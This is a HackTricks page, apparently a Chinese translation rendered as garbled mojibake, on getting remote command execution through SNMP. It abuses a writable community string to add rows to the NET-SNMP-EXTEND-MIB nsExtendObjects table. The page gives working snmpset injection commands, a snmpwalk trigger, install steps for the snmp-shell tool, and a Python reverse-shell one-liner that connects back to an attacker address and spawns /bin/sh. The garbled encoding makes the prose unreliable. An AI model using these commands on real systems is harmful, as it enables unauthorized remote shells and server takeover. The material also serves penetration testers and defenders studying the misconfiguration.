<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

# SNMP RCE

å¦‚æœç®¡ç†å‘˜å¿½è§†è®¾å¤‡æˆ–æœåŠ¡å™¨ä¸ŠSNMPçš„é»˜è®¤é…ç½®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨SNMPã€‚é€šè¿‡åœ¨Linuxæ“ä½œç³»ç»Ÿä¸Š**æ»¥ç”¨å…·æœ‰å†™æƒé™ï¼ˆrwcommunityï¼‰çš„SNMP community**ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚

## ä½¿ç”¨é™„åŠ å‘½ä»¤æ‰©å±•æœåŠ¡

è¦æ‰©å±•SNMPæœåŠ¡å¹¶æ·»åŠ é¢å¤–å‘½ä»¤ï¼Œå¯ä»¥å‘**"nsExtendObjects"è¡¨ä¸­æ·»åŠ æ–°è¡Œ**ã€‚å¯ä»¥ä½¿ç”¨`snmpset`å‘½ä»¤å¹¶æä¾›å¿…è¦çš„å‚æ•°ï¼ŒåŒ…æ‹¬å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œè¦æ‰§è¡Œçš„å‘½ä»¤æ¥å®ç°è¿™ä¸€ç‚¹ï¼š
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## æ³¨å…¥å‘½ä»¤ä»¥æ‰§è¡Œ

åœ¨ SNMP æœåŠ¡ä¸Šæ³¨å…¥è¦è¿è¡Œçš„å‘½ä»¤éœ€è¦è¢«è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶/è„šæœ¬çš„å­˜åœ¨å’Œå¯æ‰§è¡Œæ€§ã€‚**`NET-SNMP-EXTEND-MIB`** è¦æ±‚æä¾›å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚

ä¸ºäº†ç¡®è®¤æ³¨å…¥å‘½ä»¤çš„æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨ `snmpwalk` å‘½ä»¤æšä¸¾ SNMP æœåŠ¡ã€‚**è¾“å‡ºå°†æ˜¾ç¤ºå‘½ä»¤åŠå…¶ç›¸å…³ç»†èŠ‚**ï¼ŒåŒ…æ‹¬ç»å¯¹è·¯å¾„ï¼š
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## è¿è¡Œæ³¨å…¥çš„å‘½ä»¤

å½“**è¯»å–æ³¨å…¥çš„å‘½ä»¤æ—¶ï¼Œå®ƒä¼šè¢«æ‰§è¡Œ**ã€‚è¿™ç§è¡Œä¸ºè¢«ç§°ä¸º**`run-on-read()`**ã€‚å‘½ä»¤çš„æ‰§è¡Œå¯ä»¥åœ¨ snmpwalk è¯»å–è¿‡ç¨‹ä¸­è§‚å¯Ÿåˆ°ã€‚

### ä½¿ç”¨ SNMP è·å–æœåŠ¡å™¨ Shell

è¦æ§åˆ¶æœåŠ¡å™¨å¹¶è·å¾—æœåŠ¡å™¨ Shellï¼Œå¯ä»¥ä½¿ç”¨ mxrch å¼€å‘çš„ Python è„šæœ¬ï¼Œä» [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git) ä¸‹è½½ã€‚

æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡å°†ç‰¹å®šå‘½ä»¤æ³¨å…¥åˆ° SNMP ä¸­æ‰‹åŠ¨åˆ›å»ºåå‘ Shellã€‚è¿™ä¸ªå‘½ä»¤ç”± snmpwalk è§¦å‘ï¼Œå»ºç«‹ä¸€ä¸ªåå‘ Shell è¿æ¥åˆ°æ”»å‡»è€…çš„æœºå™¨ï¼Œä»è€Œæ§åˆ¶å—å®³è€…çš„æœºå™¨ã€‚
æ‚¨å¯ä»¥å®‰è£…è¿è¡Œæ­¤å‘½ä»¤æ‰€éœ€çš„å…ˆå†³æ¡ä»¶ï¼š
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
æˆ–è€…ä¸€ä¸ªåå‘ shellï¼š
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## å‚è€ƒèµ„æ–™
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
